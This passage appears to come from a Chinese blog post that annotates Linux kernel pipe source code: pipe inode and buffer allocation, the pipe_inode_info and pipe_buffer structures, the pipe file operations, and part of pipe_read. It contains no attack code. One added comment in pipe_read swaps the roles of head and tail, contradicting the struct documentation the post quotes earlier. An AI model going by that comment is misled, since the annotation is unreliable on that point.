class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> inode * <span class="hljs-title function_">get_pipe_inode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><br><span class="hljs-keyword">if</span> (!inode)<br><span class="hljs-keyword">goto</span> fail_inode;<br><br>inode-&gt;i_ino = get_next_ino();<br><span class="hljs-comment">//分配一个新的管道信息结构体 pipe_inode_info，用于存储管道的状态信息</span><br>pipe = alloc_pipe_info();<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">goto</span> fail_iput;<br><br>inode-&gt;i_pipe = pipe;<br>pipe-&gt;files = <span class="hljs-number">2</span>;<br>pipe-&gt;readers = pipe-&gt;writers = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//将管道的操作函数 pipefifo_fops 赋值给 inode 的文件操作符 i_fop</span><br>inode-&gt;i_fop = &amp;pipefifo_fops;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Mark the inode dirty from the very beginning,</span><br><span class="hljs-comment"> * that way it will never be moved to the dirty</span><br><span class="hljs-comment"> * list because &quot;mark_inode_dirty()&quot; will think</span><br><span class="hljs-comment"> * that it already _is_ on the dirty list.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//设置 inode 的状态为 I_DIRTY，表示该 inode 是脏的，需要同步到磁盘上。</span><br>inode-&gt;i_state = I_DIRTY;<br>inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;<br>inode-&gt;i_uid = current_fsuid();<br>inode-&gt;i_gid = current_fsgid();<br>inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);<br><br><span class="hljs-keyword">return</span> inode;<br><br>fail_iput:<br>iput(inode);<br><br>fail_inode:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alloc-pipe-info"><a href="#alloc-pipe-info" class="headerlink" title="alloc_pipe_info"></a>alloc_pipe_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    <span class="hljs-comment">//默认数量为 PIPE_DEF_BUFFERS （16）个，即一个管道初始默认可以存放 16 张页面的数据</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br>    <span class="hljs-comment">//user 是指向当前用户信息结构体的指针，通过 get_current_user() 函数获取</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<span class="hljs-comment">//计算出当前用户可用的管道缓冲区数量 user_bufs</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<span class="hljs-comment">//从 pipe_max_size 中读取管道的最大size</span><br><span class="hljs-comment">//调用 kzalloc() 分配大小为 sizeof(struct pipe_inode_info) 的内存空间用于管道信息结构体。如果分配失败，将跳转到 out_free_uid 标签处释放用户结构体并返回 NULL。</span><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (pipe == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out_free_uid;<br><span class="hljs-comment">//如果管道缓冲区数量乘以页大小大于最大尺寸，并且当前进程不具备 CAP_SYS_RESOURCE 能力，则将管道缓冲区数量调整为最大尺寸除以页大小。</span><br><span class="hljs-keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))<br>pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;<br><span class="hljs-comment">//调用 account_pipe_buffers() 函数来计算当前用户可用的管道缓冲区数量 user_bufs</span><br>user_bufs = account_pipe_buffers(user, <span class="hljs-number">0</span>, pipe_bufs);<br><span class="hljs-comment">//如果当前用户的管道缓冲区数量超过软限制并且管道是由非特权用户创建的，则尝试降低管道缓冲区数量到软限制以下，并将管道缓冲区数量设置为1。</span><br><span class="hljs-keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;<br>user_bufs = account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">1</span>);<br>pipe_bufs = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//如果当前用户的管道缓冲区数量超过硬限制并且管道是由非特权用户创建的，则放弃创建管道，并跳转到 out_revert_acct 标签处进行清理。</span><br><span class="hljs-keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())<br><span class="hljs-keyword">goto</span> out_revert_acct;<br><span class="hljs-comment">//分配大小为 pipe_bufs 个 struct pipe_buffer 的内存空间，并将其赋值给 pipe-&gt;bufs，表示管道的缓冲区</span><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br><br><span class="hljs-keyword">if</span> (pipe-&gt;bufs) &#123;<br>init_waitqueue_head(&amp;pipe-&gt;rd_wait);<br>init_waitqueue_head(&amp;pipe-&gt;wr_wait);<br>pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="hljs-number">1</span>;<br>pipe-&gt;max_usage = pipe_bufs;<br>pipe-&gt;ring_size = pipe_bufs;<br>pipe-&gt;nr_accounted = pipe_bufs;<br>pipe-&gt;user = user;<br>mutex_init(&amp;pipe-&gt;mutex);<br><span class="hljs-keyword">return</span> pipe;<br>&#125;<br><br>out_revert_acct:<br>(<span class="hljs-type">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">0</span>);<br>kfree(pipe);<br>out_free_uid:<br>free_uid(user);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p>管道的实质是由一个 <code>pipe_inode_info</code> 结构体来管理的，其pipe_buffer类似于循环队列。在这个循环队列中，管道的写入操作是向队列头部添加数据（即往队列尾部移动），而读取操作则是从队列尾部获取数据（即从队列头部移动）。在管道的 <code>pipe_inode_info</code> 结构体中，<code>head</code> 成员表示队列头的索引，<code>tail</code> 成员表示队列尾的索引，头进尾出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *@head: The point of buffer production</span><br><span class="hljs-comment"> *@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: cached released page</span><br><span class="hljs-comment"> *@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: reader counter</span><br><span class="hljs-comment"> *@w_counter: writer counter</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *@user: the user who created this pipe</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p><code>pipe</code>的大体结构图如下所示（图来自A3👴的blog）</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240318220949.png"></p><h2 id="pipeの函数表"><a href="#pipeの函数表" class="headerlink" title="pipeの函数表"></a>pipeの函数表</h2><p>经过如下调用链</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS">do_pipe2<br>__do_pipe_flags<br>create_pipe_files<br>alloc_file_pseudo<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//函数创建一个伪文件对象，该文件对象连接到之前获取的管道 inode 上。它将根据传入的标志设置文件的读写属性，并将其与管道的操作函数 pipefifo_fops 关联起来。如果创建失败，会释放之前分配的管道信息并释放 inode，然后返回相应的错误代码。</span><br>f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>&amp;pipefifo_fops);<br></code></pre></td></tr></table></figure><p><strong>pipefifo_ops</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>.open= fifo_open,<br>.llseek= no_llseek,<br>.read_iter= pipe_read,<br>.write_iter= pipe_write,<br>.poll= pipe_poll,<br>.unlocked_ioctl= pipe_ioctl,<br>.release= pipe_release,<br>.fasync= pipe_fasync,<br>&#125;;<br></code></pre></td></tr></table></figure><p>重点关注读写操作</p><h3 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h3><p>从<code>pipe</code>中读取数据，会调用到<code>pipe_read</code></p><p>一个接一个的读取buffer中的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<span class="hljs-comment">//用于记录管道是否满了以及是否需要唤醒下一个读取者。</span><br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-comment">/* Null read succeeds. */</span><br>    <span class="hljs-comment">//如果 total_len 为零，表示请求的读取长度为零，直接返回零，表示读取成功</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//使用 __pipe_lock 函数锁定管道，以确保在多线程环境下对管道的安全访问</span><br>__pipe_lock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We only wake up writers if the pipe was full when we started</span><br><span class="hljs-comment"> * reading in order to avoid unnecessary wakeups.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * But when we do wake up writers, we do so using a sync wakeup</span><br><span class="hljs-comment"> * (WF_SYNC), because we want them to get going and generate more</span><br><span class="hljs-comment"> * data for us.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//如果管道的头部指针等于尾部指针加上最大使用量，则表示管道已满</span><br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>    <span class="hljs-comment">//无限循环中，尝试从管道中读取数据，直到读取完成或出现错误</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">/*head 表示管道中下一个要读取的数据位置。</span><br><span class="hljs-comment">tail 表示管道中下一个要写入数据的位置。</span><br><span class="hljs-comment">mask 是一个掩码，用于计算索引，确保索引不会超出缓冲区的范围。*/</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>        <span class="hljs-comment">//如果管道的 note_loss 标志为真，并且待读取数据长度小于 8，说明缓冲区空间不足，返回错误码 -ENOBUFS。</span><br><span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br><span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>n.type = WATCH_TYPE_META;<br>n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>n.info = watch_sizeof(n);<br><span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += <span class="hljs-keyword">sizeof</span>(n);<br>total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//如果管道非空，尝试从管道中读取数据</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<br>            <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<span class="hljs-comment">//获取当前尾部指针 tail 对应的管道缓冲区 buf                                     </span><br><span class="hljs-type">size_t</span> chars = buf-&gt;len;<span class="hljs-comment">//计算当前缓冲区中可读取的数据长度 chars</span><br><span class="hljs-type">size_t</span> written;<br><span class="hljs-type">int</span> error;<br><span class="hljs-comment">//如果缓冲区中的数据长度大于待读取数据长度 total_len，则将待读取数据长度更新为 total_len</span><br><span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>chars = total_len;<br>&#125;<br><span class="hljs-comment">//确认管道缓冲区</span><br>error = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (error) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = error;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//从缓冲区中读取数据到目标缓冲区 to</span><br>written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br><span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>            <span class="hljs-comment">//更新返回值 ret、管道缓冲区中的偏移量和长度，并清理空的数据包缓冲区</span><br>ret += chars;<br>buf-&gt;offset += chars;<br>buf-&gt;len -= chars;<br><br><span class="hljs-comment">/* Was it a packet buffer? Clean up and exit */</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>total_len = chars;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//如果缓冲区已空，则释放缓冲区，并更新尾部指针 tail</span><br><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>tail++;<br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br>            <span class="hljs-comment">//更新待读取数据长度 total_len</span><br>total_len -= chars;<br>            <span class="hljs-comment">//如果读取完成，则跳出循环；否则继续尝试读取更多数据</span><br><span class="hljs-keyword">if</span> (!total_len)<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">/* common path: read succeeded */</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail))<span class="hljs-comment">/* More to do? */</span><br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span 